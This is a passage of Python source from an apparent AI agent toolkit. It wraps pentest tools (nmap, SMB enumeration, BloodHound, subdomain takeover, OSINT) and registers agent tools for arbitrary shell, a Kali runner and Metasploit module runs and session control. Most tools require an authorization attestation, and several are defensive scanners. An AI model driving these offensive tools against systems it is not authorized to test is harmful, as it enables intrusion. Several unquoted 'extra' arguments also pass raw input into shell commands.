    """Run a file-scanning command where the files live. Host binary first; else
    copy the path into sygnif-py's Docker toolbox (if it has the binary) and run
    there — so these work with zero host installs when Docker is present."""
    ap = os.path.abspath(os.path.expanduser(path))
    if _run_host("command -v " + shlex.quote(need_bin), 10)[1] == 0:
        out, rc = _run_host(cmd_tmpl.format(p=shlex.quote(ap)), timeout)
        return out, rc, "host"
    box = _toolbox_name(auto_create=True)
    if box and _run_host("docker exec " + box + " command -v " + shlex.quote(need_bin), 15)[1] == 0:
        dst = "/tmp/scan_" + str(abs(hash(ap)) % 100000)
        _run_host(f"docker cp {shlex.quote(ap)} {box}:{dst}", 300)
        out, rc = _run_host("docker exec " + box + " bash -lc " + shlex.quote(cmd_tmpl.format(p=dst)), timeout)
        _run_host(f"docker exec {box} rm -rf {shlex.quote(dst)}", 30)
        return out, rc, f"docker:{box}"
    return "", 127, "missing:" + need_bin


def tool_secrets_scan(args: dict) -> str:
    path = os.path.expanduser(str(args.get("path") or args.get("repo") or "."))
    if not os.path.exists(path):
        return f"secrets_scan: path not found: {path}"
    tmpl = ("echo '== trufflehog =='; trufflehog filesystem {p} --no-update 2>/dev/null | head -200; "
            "echo '== gitleaks =='; gitleaks detect --source {p} --no-banner -v 2>/dev/null | head -200")
    out, rc, where = _local_or_toolbox(path, tmpl, "trufflehog", 600)
    if where.startswith("missing"):
        return ("secrets_scan needs trufflehog/gitleaks. Either install them on this host, or "
                "provision the toolbox with `sygnif kali-setup` (Docker) and they'll run there.")
    return _off_report("secrets_scan", "own code", f"scan {path}", out, rc, where)


# 2. sast — semgrep static analysis of your own source (runs on host)
def tool_sast(args: dict) -> str:
    path = os.path.expanduser(str(args.get("path") or "."))
    cfg = str(args.get("config", "auto")).strip() or "auto"
    tmpl = "semgrep --config " + shlex.quote(cfg) + " {p} --quiet 2>&1 | head -300"
    out, rc, where = _local_or_toolbox(path, tmpl, "semgrep", 900)
    if where.startswith("missing"):
        return ("sast needs semgrep. Install on host (pipx install semgrep), or provision the "
                "toolbox with `sygnif kali-setup` (Docker) and it'll run there.")
    return _off_report("sast (semgrep)", "own code", f"semgrep {cfg} {path}", out, rc, where)


# 3. tls_check — testssl / sslscan on an authorized host
def tool_tls_check(args: dict) -> str:
    target = str(args.get("target", "") or args.get("host", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    host = _bare_host(target)
    if _have("testssl") or _have("testssl.sh"):
        cmd = f"(testssl --quiet --color 0 {shlex.quote(host)} 2>/dev/null || testssl.sh --quiet {shlex.quote(host)}) | head -120"
    else:
        cmd = f"sslscan --no-colour {shlex.quote(host)} 2>/dev/null | head -120"
    out, rc, where = _off_run(cmd, 600)
    return _off_report("tls_check", args.get("authorization", ""), cmd, out, rc, where)


# 4. headers — security header + cookie grade (keyless, one GET, passive)
def tool_headers(args: dict) -> str:
    url = _norm_url(str(args.get("url", "") or args.get("target", "")))
    if not url:
        return "headers: give a 'url' (yours / authorized)."
    h, status, err = _resp_headers(url)
    if not h and err:
        return f"headers: could not fetch {url} ({err})."
    want = {
        "content-security-policy": "CSP — controls script/resource origins (XSS defence)",
        "strict-transport-security": "HSTS — forces HTTPS",
        "x-content-type-options": "nosniff — stops MIME sniffing",
        "x-frame-options": "clickjacking defence (or CSP frame-ancestors)",
        "referrer-policy": "limits referrer leakage",
        "permissions-policy": "restricts browser features",
    }
    lines = [f"Security headers for {url} (HTTP {status}):"]
    missing = []
    for k, why in want.items():
        v = h.get(k)
        if v:
            lines.append(f"  OK  {k}: {v[:80]}")
        else:
            missing.append(k)
            lines.append(f"  --  MISSING {k}  ({why})")
    server = h.get("server")
    if server:
        lines.append(f"  info server: {server} (version disclosure — consider hiding)")
    cookies = h.get("set-cookie", "")
    if cookies:
        flags = [f for f in ("HttpOnly", "Secure", "SameSite") if f.lower() not in cookies.lower()]
        lines.append("  cookie flags missing: " + (", ".join(flags) if flags else "none — good"))
    aco = h.get("access-control-allow-origin")
    if aco == "*":
        lines.append("  ⚠ CORS: Access-Control-Allow-Origin: * (risk if credentials are allowed)")
    lines.insert(1, f"  score: {len(want)-len(missing)}/{len(want)} present"
                    + (f" — add: {', '.join(missing)}" if missing else " — all present"))
    return _truncate("\n".join(lines))


# 5. takeover — subdomain takeover check (subfinder -> subjack / nuclei)
def tool_takeover(args: dict) -> str:
    domain = str(args.get("domain", "") or args.get("target", "")).strip()
    g = _authz(args, domain)
    if g:
        return g
    d = _bare_host(domain)
    cmd = (f"subfinder -silent -d {shlex.quote(d)} 2>/dev/null | tee /tmp/_subs.txt | wc -l | xargs echo 'subdomains:'; "
           f"echo '== subjack =='; subjack -w /tmp/_subs.txt -ssl -t 50 -timeout 15 2>/dev/null | grep -iv 'Not Vulnerable' | head -40; "
           f"echo '== nuclei takeover =='; nuclei -silent -l /tmp/_subs.txt -tags takeover 2>/dev/null | head -40")
    out, rc, where = _off_run(cmd, 900)
    return _off_report("takeover", args.get("authorization", ""), "takeover " + d, out, rc, where)


# 6. osint — passive intelligence on an authorized domain
def tool_osint(args: dict) -> str:
    domain = str(args.get("domain", "") or args.get("target", "")).strip()
    g = _authz(args, domain)
    if g:
        return g
    uname = str(args.get("username", "")).strip()
    if uname:
        cmd = "sherlock " + shlex.quote(uname) + " --timeout 15 --print-found 2>/dev/null | head -60"
        out, rc, where = _off_run(cmd, 300)
        return _off_report("osint(username)", args.get("authorization", ""), "sherlock " + uname, out, rc, where)
    d = shlex.quote(_bare_host(domain))
    cmd = (f"echo '== theHarvester =='; theHarvester -d {d} -b duckduckgo,crtsh,bing -l 200 2>/dev/null | grep -iE '@|host|ip' | head -60; "
           f"echo '== dns =='; dnsx -silent -a -resp -d {d} 2>/dev/null | head -20; "
           f"echo '== SPF/DMARC =='; dig +short TXT {d}; dig +short TXT _dmarc.{d}")
    out, rc, where = _off_run(cmd, 600)
    return _off_report("osint", args.get("authorization", ""), "osint " + _bare_host(domain), out, rc, where)


# 7. portscan — structured nmap on an authorized target
def tool_portscan(args: dict) -> str:
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    ports = str(args.get("ports", "")).strip()
    extra = str(args.get("extra", "")).strip()
    pflag = f"-p {shlex.quote(ports)}" if ports else "--top-ports 1000"
    cmd = f"nmap -sV -sC {pflag} -Pn {shlex.quote(target)} {extra} 2>&1 | head -150"
    out, rc, where = _off_run(cmd, 900)
    return _off_report("portscan", args.get("authorization", ""), cmd, out, rc, where)


# 8. netenum — SMB / SNMP / service enumeration on an authorized host
def tool_netenum(args: dict) -> str:
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    svc = str(args.get("service", "smb")).lower()
    t = shlex.quote(target)
    if svc == "snmp":
        cmd = f"onesixtyone {t} public 2>/dev/null; echo '=='; snmpwalk -v2c -c public -Cc {t} 2>/dev/null | head -60"
    else:  # smb
        cmd = (f"echo '== enum4linux-ng =='; enum4linux-ng -A {t} 2>/dev/null | head -120; "
               f"echo '== smbmap =='; smbmap -H {t} 2>/dev/null | head -40; "
               f"echo '== nxc =='; nxc smb {t} --shares 2>/dev/null | head -40")
    out, rc, where = _off_run(cmd, 600)
    return _off_report("netenum(" + svc + ")", args.get("authorization", ""), cmd, out, rc, where)


# 9. pw_strength — local strength estimate + HaveIBeenPwned breach check.
#    The password is NEVER sent: only the first 5 chars of its SHA-1 hash (HIBP
#    k-anonymity). Purely a defensive self-test.
def tool_pw_strength(args: dict) -> str:
    pw = str(args.get("password", "") or args.get("pw", ""))
    if not pw:
        return ("pw_strength: give a 'password' to test. It is checked LOCALLY; only a 5-char "
                "SHA-1 prefix is sent to HaveIBeenPwned, never the password itself.")
    cs = (26 if re.search(r"[a-z]", pw) else 0) + (26 if re.search(r"[A-Z]", pw) else 0) \
        + (10 if re.search(r"\d", pw) else 0) + (33 if re.search(r"[^A-Za-z0-9]", pw) else 0)
    entropy = round(len(pw) * math.log2(cs), 1) if cs else 0.0
    verdict = ("very weak" if entropy < 28 else "weak" if entropy < 36
               else "reasonable" if entropy < 60 else "strong" if entropy < 128 else "very strong")
    notes = []
    if len(pw) < 12:
        notes.append("under 12 chars — length matters most")
    if re.fullmatch(r"[a-z]+|\d+", pw):
        notes.append("single character class")
    if re.search(r"(.)\1\1", pw):
        notes.append("repeated characters")
    h = hashlib.sha1(pw.encode()).hexdigest().upper()
    body, status, _ = _http_get(HIBP_RANGE + h[:5], headers={"User-Agent": _BROWSER_UA, "Add-Padding": "true"})
    breached = 0
    for line in (body or "").splitlines():
        p = line.strip().split(":")
        if len(p) == 2 and p[0] == h[5:]:
            breached = int(p[1])
            break
    out = [f"Password strength (length {len(pw)}): {verdict}  (~{entropy} bits, charset {cs})"]
    if notes:
        out.append("  weaknesses: " + "; ".join(notes))
    if breached:
        out.append(f"  ⚠ BREACHED: seen {breached:,} times in known breaches (HIBP) — do NOT use it.")
    else:
        out.append("  not found in HIBP breach corpus (good, but that alone doesn't make it strong).")
    return "\n".join(out)


# 10. cell_info — DEFENSIVE cellular: own modem serving cell + tower lookup +
#     IMSI-catcher detection guidance. No transmitting / no interception.
def tool_cell_info(args: dict) -> str:
    mode = str(args.get("mode", "serving")).lower()
    if mode == "lookup":
        for k in ("mcc", "mnc", "lac", "cellid"):
            if not str(args.get(k, "")).strip():
                return "cell_info lookup: give mcc, mnc, lac, cellid (from a tower you can see). Needs OPENCELLID_API_KEY."
        if not OPENCELLID_KEY:
            return "cell_info lookup: set OPENCELLID_API_KEY (free at opencellid.org) to geolocate a cell tower."
        qs = urllib.parse.urlencode({"key": OPENCELLID_KEY, "mcc": args["mcc"], "mnc": args["mnc"],
                                     "lac": args["lac"], "cellid": args["cellid"], "format": "json"})
        body, status, err = _http_get(OPENCELLID + "?" + qs, headers={"User-Agent": _BROWSER_UA})
        return f"OpenCellID lookup (HTTP {status}):\n{body[:600]}" if body else f"cell_info: {err}"
    if mode == "detect":
        return ("IMSI-catcher / rogue-base-station DETECTION (defensive):\n"
                "- Watch for a sudden drop to 2G/GSM, a new unknown CellID with strong signal, or "
                "  cipher downgrade. Tools: SnoopSnitch (rooted Android) or Crocodile Hunter (SDR).\n"
                "- Compare the serving CellID/LAC against OpenCellID for the area (mode=lookup).\n"
                "- This tool only OBSERVES your own link. Transmitting on cellular bands or "
                "intercepting others' traffic is illegal and not provided.")
    # serving: read the OWN modem via ModemManager
    if _run_host("command -v mmcli", 10)[1] != 0:
        return ("cell_info serving: ModemManager (mmcli) not found. It reads YOUR OWN modem's "
                "serving cell (operator, tech, signal, cell id). Install: apt install modemmanager.")
    cmd = ("m=$(mmcli -L 2>/dev/null | grep -oE '/Modem/[0-9]+' | head -1); "
           "[ -n \"$m\" ] && mmcli -m \"$m\" 2>/dev/null | grep -iE 'operator|access tech|signal|state|3gpp|registration' "
           "&& mmcli -m \"$m\" --location-get 2>/dev/null | grep -iE 'cell|lac|mcc|mnc|operator' "
           "|| echo 'no modem found via ModemManager'")
    out, rc = _run_host(cmd, 30)
    return _off_report("cell_info(serving, own modem)", "own device", "mmcli serving cell", out, rc, "host")


# --- Further ethical-hacking tools: containers, visual/AD/cloud recon,
#     crypto/encoding, website utilities --------------------------------------
import base64 as _b64
import hmac as _hmac


# 1. container_scan — trivy: images, filesystems, repos, IaC (+ secrets/CVEs)
def tool_container_scan(args: dict) -> str:
    tgt = str(args.get("target", "") or args.get("image", "") or ".").strip()
    kind = str(args.get("type", "")).strip().lower()
    if not kind:
        kind = "image" if ("/" in tgt or ":" in tgt) and not os.path.exists(os.path.expanduser(tgt)) else "fs"
    if kind == "image":
        cmd = f"trivy image --scanners vuln,secret,misconfig --quiet {shlex.quote(tgt)} 2>&1 | head -200"
        out, rc, where = _off_run(cmd, 900)
        if rc != 0 and not _have("trivy"):
            return "container_scan needs trivy in the toolbox — run `sygnif kali-setup`, or install trivy."
        return _off_report("container_scan(image)", "own image", cmd, out, rc, where)
    # fs / repo / config: files on the host
    sub = {"fs": "fs", "repo": "repo", "config": "config"}.get(kind, "fs")
    tmpl = "trivy " + sub + " --scanners vuln,secret,misconfig --quiet {p} 2>&1 | head -200"
    out, rc, where = _local_or_toolbox(tgt, tmpl, "trivy", 900)
    if where.startswith("missing"):
        return "container_scan needs trivy on the host or in the toolbox (`sygnif kali-setup`)."
    return _off_report("container_scan(" + sub + ")", "own code", "trivy " + sub + " " + tgt, out, rc, where)


# 2. webshot — bulk screenshots of authorized hosts (gowitness / eyewitness)
def tool_webshot(args: dict) -> str:
    target = str(args.get("target", "") or args.get("url", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    outdir = "/tmp/webshot_" + str(abs(hash(target)) % 100000)
    u = shlex.quote(target if target.startswith("http") else "https://" + target)
    cmd = (f"mkdir -p {outdir}; (gowitness scan single --url {u} -s {outdir} 2>/dev/null "
           f"|| gowitness single {u} -P {outdir} 2>/dev/null "
           f"|| eyewitness --web --single {u} -d {outdir} --no-prompt 2>/dev/null); "
           f"ls -1 {outdir}/**/*.png {outdir}/*.png 2>/dev/null | head")
    out, rc, where = _off_run(cmd, 300)
    return _off_report("webshot", args.get("authorization", ""),
                       "screenshot " + target + " -> " + outdir, out or "(no output)", rc, where)


# 3. ad_enum — BloodHound collection against an authorized Active Directory
def tool_ad_enum(args: dict) -> str:
    domain = str(args.get("domain", "")).strip()
    g = _authz(args, domain)
    if g:
        return g
    dc = str(args.get("dc", "") or args.get("nameserver", "")).strip()
    user = str(args.get("user", "")).strip()
    pw = str(args.get("password", "")).strip()
    if not (dc and user and pw):
        return ("ad_enum: give domain + 'dc' (DC IP/host) + 'user' + 'password' for an AD you are "
                "authorized to test. Collects BloodHound data (users, groups, ACLs, sessions).")
    outdir = "/tmp/bh_" + str(abs(hash(domain)) % 100000)
    cmd = (f"mkdir -p {outdir}; cd {outdir}; bloodhound-python -d {shlex.quote(domain)} "
           f"-u {shlex.quote(user)} -p {shlex.quote(pw)} -ns {shlex.quote(dc)} -c All --zip 2>&1 | tail -30; "
           f"echo '== output =='; ls -1 {outdir}")
    out, rc, where = _off_run(cmd, 900)
    return _off_report("ad_enum(bloodhound)", args.get("authorization", ""),
                       "bloodhound-python " + domain, out, rc, where)


# 4. cloud_audit — Prowler cloud posture (AWS/GCP/Azure). Needs cloud creds in env.
def tool_cloud_audit(args: dict) -> str:
    provider = str(args.get("provider", "aws")).strip().lower()
    if provider not in ("aws", "gcp", "azure", "kubernetes"):
        return "cloud_audit: provider must be aws | gcp | azure | kubernetes."
    g = _authz(args, provider + "-account")
    if g:
        return g
    extra = str(args.get("extra", "")).strip()
    ensure = ("command -v prowler >/dev/null 2>&1 || pipx install prowler >/dev/null 2>&1 "
              "|| pip install --break-system-packages prowler >/dev/null 2>&1; ")
    cmd = ensure + f"prowler {shlex.quote(provider)} --no-banner {extra} 2>&1 | tail -120"
    out, rc, where = _off_run(cmd, 1800)
    if "command not found" in out or ("prowler" not in out and rc != 0):
        return ("cloud_audit: could not run/install prowler. Provision the toolbox "
                "(`sygnif kali-setup`) or `pipx install prowler`. Cloud creds come from the "
                "environment (AWS: ~/.aws or AWS_* env; GCP: ADC; Azure: az login).")
    return _off_report("cloud_audit(" + provider + ")", args.get("authorization", ""),
                       "prowler " + provider, out, rc, where)


# 5. crypto — encode / decode / hash / hmac / jwt / identify / magic-decrypt.
#    Local, deterministic; identify + magic use the toolbox (hashid/ciphey).
def tool_crypto(args: dict) -> str:
    op = str(args.get("op", "")).strip().lower()
    data = str(args.get("data", "") or args.get("text", ""))
    algo = str(args.get("algo", "") or args.get("scheme", "")).strip().lower()
    key = str(args.get("key", ""))
    if not op:
        return ("crypto: op = encode|decode|hash|hmac|jwt|identify|magic. "
                "encode/decode algo=base64|hex|url|rot13; hash algo=md5|sha1|sha256|sha512; "
                "hmac needs key+algo; jwt decodes a token; identify names a hash; magic auto-decodes (ciphey).")
    try:
        if op == "encode":
            if algo in ("base64", "b64"):
                return _b64.b64encode(data.encode()).decode()
            if algo == "hex":
                return data.encode().hex()
            if algo == "url":
                return urllib.parse.quote(data)
            if algo == "rot13":
                import codecs
                return codecs.encode(data, "rot13")
            return "crypto encode: algo = base64|hex|url|rot13"
        if op == "decode":
            if algo in ("base64", "b64"):
                return _b64.b64decode(data + "=" * (-len(data) % 4)).decode(errors="replace")
            if algo == "hex":
                return bytes.fromhex(data.strip()).decode(errors="replace")
            if algo == "url":
                return urllib.parse.unquote(data)
            if algo == "rot13":
                import codecs
                return codecs.encode(data, "rot13")
            return "crypto decode: algo = base64|hex|url|rot13"
        if op == "hash":
            import hashlib
            algo = algo or "sha256"
            if algo not in hashlib.algorithms_available:
                return f"crypto hash: unknown algo '{algo}'"
            return f"{algo}({len(data)} bytes) = " + hashlib.new(algo, data.encode()).hexdigest()
        if op == "hmac":
            import hashlib
            if not key:
                return "crypto hmac: give a 'key' and algo (default sha256)."
            return f"hmac-{algo or 'sha256'} = " + _hmac.new(key.encode(), data.encode(),
                                                             algo or "sha256").hexdigest()
        if op == "jwt":
            parts = data.strip().split(".")
            if len(parts) < 2:
                return "crypto jwt: not a JWT (need header.payload.signature)."
            def d(seg):
                return _b64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4)).decode(errors="replace")
            return ("JWT (decoded, NOT verified):\n  header:  " + d(parts[0])
                    + "\n  payload: " + d(parts[1])
                    + "\n  [signature not checked — decode only]")
        if op == "identify":
            out, rc, where = _off_run("echo " + shlex.quote(data) + " | hashid -m 2>/dev/null | head -20 "
                                      "|| nth -t " + shlex.quote(data) + " 2>/dev/null | head -20", 30)
            return out or "crypto identify: no match (need hashid/name-that-hash in the toolbox)."
        if op == "magic":
            out, rc, where = _off_run("echo " + shlex.quote(data) + " | ciphey -- - 2>/dev/null | head -20", 120)
            return out or "crypto magic: ciphey found nothing (or not installed in the toolbox)."
    except Exception as e:  # noqa: BLE001
        return f"crypto {op}: {type(e).__name__}: {e}"
    return "crypto: unknown op '" + op + "'"


# 6. website — quick site-recon utilities (robots/sitemap/security.txt, DNS,
#    whois, tech, wayback). Passive; a handful of GETs + DNS.
def tool_website(args: dict) -> str:
    url = _norm_url(str(args.get("url", "") or args.get("target", "")))
    if not url:
        return "website: give a 'url'."
    host = _bare_host(url)
    lines = [f"Website recon: {url}"]
    for p in ("/robots.txt", "/sitemap.xml", "/.well-known/security.txt"):
        body, status, _ = _http_get(url + p, headers={"User-Agent": _BROWSER_UA})
        first = (body or "").strip().splitlines()[:3]
        lines.append(f"  {p}: HTTP {status}" + (("  " + " | ".join(first)) if status == 200 and first else ""))
    # wayback snapshot count (keyless CDX)
    wb, wstat, _ = _http_get(
        "https://web.archive.org/cdx/search/cdx?url=" + urllib.parse.quote(host)
        + "*&output=json&fl=original&collapse=urlkey&limit=5000", headers={"User-Agent": _BROWSER_UA})
    n = max(0, len((wb or "").strip().splitlines()) - 1) if wstat == 200 else 0
    lines.append(f"  wayback snapshots (unique URLs): ~{n}")
    # DNS + whois + tech via the toolbox/host
    dq = shlex.quote(host)
    out, rc, where = _off_run(
        f"echo '== dns =='; dig +short A {dq}; dig +short MX {dq}; "
        f"echo '== whois =='; whois {dq} 2>/dev/null | grep -iE 'registrar|creation|expir|name server' | head; "
        f"echo '== tech =='; whatweb -q {dq} 2>/dev/null", 120)
    lines.append(out.strip() if out.strip() else "  (dns/whois/whatweb unavailable)")
    return _truncate("\n".join(lines))


# name -> {desc, args (name->hint), func}
BUILTIN_TOOLS: dict[str, dict] = {
    "shell": {
        "desc": (
            "Run a command on THIS machine (as the seat user) and return its "
            "stdout, stderr and exit code. Use it to inspect the system, run "
            "builds/tests, or drive any CLI tool that is installed."
        ),
        "args": {"command": "the shell command to run, e.g. 'ls -la ~'"},
        "func": tool_shell,
    },
    "read_file": {
        "desc": "Read a UTF-8 text file. Optional 0-based 'start'/'end' line range.",
        "args": {
            "path": "file path (supports ~)",
            "start": "optional first line (0-based)",
            "end": "optional end line (exclusive)",
        },
        "func": tool_read_file,
    },
    "write_file": {
        "desc": "Write (overwrite) a UTF-8 text file, creating parent dirs as needed.",
        "args": {"path": "file path (supports ~)", "content": "full file contents"},
        "func": tool_write_file,
    },
    "note": {
        "desc": "Append a timestamped line to the working journal — record decisions, findings, and where evidence lives.",
        "args": {"text": "the note to record"},
        "func": tool_note,
    },
    "dev_apply_and_test": {
        "desc": (
            "Development hand: write one or more files, then run a check/test "
            "command and report BOTH the writes and the test result (stdout + "
            "PASS/FAIL). Use this to make a change and prove it in one step — "
            "never claim a build works without the test actually passing here."
        ),
        "args": {
            "path": "single file to write (use with 'content')",
            "content": "contents for 'path'",
            "files": "OR a list of {path, content} objects to write together",
            "test": "shell command that proves the change (e.g. 'pytest -q', 'python x.py', 'npm test')",
        },
        "func": tool_dev_apply_and_test,
    },
    "centre": {
        "desc": (
            "Ask the SYGNIF py Centre (the knot point) for a capability. Dispatch "
            "a neuron by name: 'sys.state' (host snapshot), 'sys.procs', "
            "'knowledge.search'/'knowledge.read', 'note.write'/'note.read', plus "
            "any neurons the operator has added. Requires `sygnif-centre` running."
        ),
        "args": {
            "neuron": "neuron name, e.g. 'sys.state' or 'knowledge.search'",
            "args": "object of arguments for that neuron (may be empty)",
        },
        "func": tool_centre,
    },
    "commander": {
        "desc": (
            "Use the SYGNIF py commander (the hands) for sandboxed, allowlisted "
            "operations on a host: 'fs_read'/'fs_write'/'fs_list', 'code_search', "
            "'proc_exec' (named commands only). Requires `sygnif-commander` "
            "running and its token exported to this seat."
        ),
        "args": {
            "name": "commander tool, e.g. 'fs_read', 'code_search', 'proc_exec'",
            "args": "object of arguments for that tool",
        },
        "func": tool_commander,
    },
    "web": {
        "desc": (
            "Reach the internet. Give a 'url' to fetch a page (HTML stripped to "
            "text by default; pass raw=true for the source), OR a 'query' to run "
            "a keyless web search and get the top result links. Ground claims in "
            "what the page actually returned."
        ),
        "args": {
            "url": "URL to GET, e.g. 'https://example.com'",
            "query": "OR a web-search query when you don't have a URL",
            "raw": "optional 'true' to return raw HTML instead of stripped text",
        },
        "func": tool_web,
    },
    "github": {
        "desc": (
            "Search GitHub for tools, libraries and repos. Give a 'query'; get the "
            "top repositories (name, stars, language, description, URL). Set "
            "kind='code' to search source instead. No key needed; a GITHUB_TOKEN "
            "in the environment raises the rate limit."
        ),
        "args": {
            "query": "what to search for, e.g. 'subdomain enumeration tool'",
            "kind": "'repositories' (default) or 'code'",
            "limit": "how many results (default 10)",
        },
        "func": tool_github,
    },
    "kali": {
        "desc": (
            "Run a pentest tool with the Kali toolset and return its real output. "
            "Uses the 'sygnif-kali' Docker container when it is up (like the pi "
            "seat); otherwise runs on this host, which on a native Kali box "
            "already has the tools. Only act against AUTHORIZED targets."
        ),
        "args": {"command": "command to run, e.g. 'nmap -sV target' or 'nikto -h url'"},
        "func": tool_kali,
    },
    "kali_tools": {
        "desc": (
            "List the Kali tools actually available (queried live from the "
            "'sygnif-kali' container), grouped by kill-chain category, or check "
            "one named tool. Use this before reaching for 'kali' so you never "
            "assume a tool that is not installed."
        ),
        "args": {
            "category": "optional: recon|web|passwords|smb_ad|exploit|sniff_mitm|wireless|pivot|forensics_re|essentials",
            "check": "optional: a single tool name to confirm on PATH, e.g. 'nuclei'",
        },
        "func": tool_kali_tools,
    },
    "metasploit": {
        "desc": ("Drive Metasploit via its RPC daemon in the sygnif-kali container — "
                 "structured results, not screen-scraping. actions: version, search, info, "
                 "options, run, sessions, session_read, session_write. AUTHORIZED targets only."),
        "args": {"action": "version|search|info|options|run|sessions|session_read|session_write",
                 "query": "for search", "module": "full module path for info/options/run",
                 "options": "dict of module options for run", "id": "session id",
                 "command": "for session_write"},
        "func": tool_metasploit,
    },
    "purple": {
        "desc": ("Run a DEFENSIVE (blue-team) command in the sygnif-purple container: "
                 "detection, incident response, forensics, log/traffic analysis (suricata, "
                 "zeek, wireshark/tshark, yara, volatility3, sleuthkit, clamav, rkhunter). "
                 "For analysis and hardening, not attacking."),
        "args": {"command": "defensive command, e.g. 'yara rules.yar sample' or 'zeek -r capture.pcap'"},
        "func": tool_purple,
    },
    "phase": {
        "desc": ("Get or set the current pentest phase (recon, enum, vuln, exploit, "
                 "postexploit, report). The phase tags every finding so the report reads "
                 "as a methodical walk. No args = show current; set=<phase> to advance."),
        "args": {"set": "optional: the phase to move to"},
        "func": tool_phase,
    },
    "finding": {
        "desc": ("Record a verified finding — EVIDENCE REQUIRED. A finding with no proof, "
                 "or proof too thin to be real tool output, is refused. Fields: title, "
                 "severity (info|low|medium|high|critical), target, evidence (command + real "
                 "output snippet), and optional description, recommendation."),
        "args": {"title": "short name of the issue", "severity": "info|low|medium|high|critical",
                 "target": "host/IP/URL affected", "evidence": "the command run and a snippet of its real output",
                 "description": "optional: what it is and impact", "recommendation": "optional: the fix"},
        "func": tool_finding,
    },
    "report": {
        "desc": ("Render all recorded findings into a Markdown pentest report in the workspace, "
                 "grouped by severity, each with evidence and a fix. Pulls the header from "
                 "SCOPE.md. Run at the end or any time for a running picture."),
        "args": {},
        "func": tool_report,
    },
    "secrets_scan": {
        "desc": "Scan a repo/dir you own for leaked secrets (API keys, tokens, creds) with trufflehog + gitleaks. Runs on this host.",
        "args": {"path": "repo/dir to scan (default .)"},
        "func": tool_secrets_scan,
    },
    "sast": {
        "desc": "Static analysis of YOUR source for vulns (injection/XSS/secrets/misconfig) via semgrep. Runs on this host (needs semgrep).",
        "args": {"path": "source dir (default .)", "config": "semgrep config (default auto)"},
        "func": tool_sast,
    },
    "tls_check": {
        "desc": "TLS/SSL audit of an authorized host (testssl/sslscan): protocol versions, weak ciphers, cert. Requires target+authorization.",
        "args": {"target": "host you are authorized to test", "authorization": "attestation"},
        "func": tool_tls_check,
    },
    "headers": {
        "desc": "Grade a URL's security headers + cookie flags + CORS (keyless, single GET). Passive.",
        "args": {"url": "URL to check"},
        "func": tool_headers,
    },
    "takeover": {
        "desc": "Subdomain-takeover check on an authorized domain (subfinder -> subjack/nuclei). Requires target+authorization.",
        "args": {"domain": "domain you are authorized to test", "authorization": "attestation"},
        "func": tool_takeover,
    },
    "osint": {
        "desc": "Passive OSINT on an authorized domain (theHarvester, dnsx, SPF/DMARC). Requires target+authorization.",
        "args": {"domain": "domain you are authorized to test", "authorization": "attestation"},
        "func": tool_osint,
    },
    "portscan": {
        "desc": "Structured nmap service scan of an authorized target. Requires target+authorization.",
        "args": {"target": "host/range you are authorized to test", "authorization": "attestation", "ports": "e.g. 1-1000 (default top-1000)", "extra": "extra nmap flags"},
        "func": tool_portscan,
    },
    "netenum": {
        "desc": "Network service enumeration (SMB via enum4linux-ng/smbmap/nxc, or SNMP) on an authorized host. Requires target+authorization.",
        "args": {"target": "host you are authorized to test", "authorization": "attestation", "service": "smb (default) or snmp"},
        "func": tool_netenum,
    },
    "pw_strength": {
        "desc": "Test a password's strength locally + check HaveIBeenPwned (k-anonymity: only a SHA-1 prefix is sent, never the password). Defensive self-test.",
        "args": {"password": "the password to test"},
        "func": tool_pw_strength,
    },
    "cell_info": {
        "desc": ("DEFENSIVE cellular info: your OWN modem's serving cell (mode=serving, via mmcli), "
                 "tower geolocation (mode=lookup, OpenCellID), or IMSI-catcher detection guidance "
                 "(mode=detect). No transmitting / no interception."),
        "args": {"mode": "serving (default) | lookup | detect", "mcc": "for lookup", "mnc": "for lookup", "lac": "for lookup", "cellid": "for lookup"},
        "func": tool_cell_info,
    },
    "container_scan": {
        "desc": "Scan a container image, filesystem, repo, or IaC for CVEs + secrets + misconfig (trivy). type=image|fs|repo|config.",
        "args": {"target": "image ref or path (default .)", "type": "image|fs|repo|config"},
        "func": tool_container_scan,
    },
    "webshot": {
        "desc": "Screenshot an authorized web host (gowitness/eyewitness) — visual recon / fleet overview. Requires target+authorization.",
        "args": {"target": "URL/host you are authorized to test", "authorization": "attestation"},
        "func": tool_webshot,
    },
    "ad_enum": {
        "desc": "Collect BloodHound data from an authorized Active Directory (bloodhound-python). Requires domain+dc+user+password+authorization.",
        "args": {"domain": "AD domain", "dc": "DC IP/host", "user": "AD user", "password": "AD password", "authorization": "attestation"},
        "func": tool_ad_enum,
    },
    "cloud_audit": {
        "desc": "Cloud security-posture audit with Prowler (aws|gcp|azure|kubernetes). Uses cloud creds from the environment. Requires authorization; auto-installs prowler in the toolbox.",
        "args": {"provider": "aws|gcp|azure|kubernetes", "authorization": "attestation", "extra": "extra prowler flags"},
        "func": tool_cloud_audit,
    },
    "crypto": {
        "desc": "Encode/decode/hash/hmac/JWT-decode/identify/magic-decrypt. Local + deterministic (identify+magic use the toolbox).",
        "args": {"op": "encode|decode|hash|hmac|jwt|identify|magic", "data": "the input", "algo": "base64|hex|url|rot13 or md5|sha256|...", "key": "for hmac"},
        "func": tool_crypto,
    },
    "website": {
        "desc": "Quick website recon: robots/sitemap/security.txt, DNS, whois, tech fingerprint, wayback snapshot count. Passive.",
        "args": {"url": "the site URL"},
        "func": tool_website,
    },
    "recon": {
        "desc": ("Recon/OSINT on an authorized target domain: subdomains (subfinder), DNS + "
                 "SPF/DMARC, tech fingerprint (whatweb), and live-host probing (httpx). Requires "
                 "'target' + 'authorization'; SCOPE.md-confined when present."),
        "args": {"target": "domain you are authorized to test", "authorization": "who authorized it (owner/engagement/ticket)", "extra": "optional extra shell to append"},
        "func": tool_recon,
    },
    "nuclei": {
        "desc": ("Templated vulnerability scan (nuclei) of an authorized URL — CVEs, misconfig, "
                 "exposures. Set SYGNIF_PY_NUCLEI_EXTRA_TEMPLATES to add the Wordfence WP-CVE "
                 "template set. Requires 'target'+'authorization'."),
        "args": {"target": "URL you are authorized to test", "authorization": "attestation", "tags": "optional nuclei tags e.g. wordpress,cve", "severity": "optional e.g. critical,high", "extra": "optional extra flags"},
        "func": tool_nuclei,
    },
    "wpscan": {
        "desc": ("Full WordPress enumeration (wpscan): vulnerable plugins/themes, users, config "
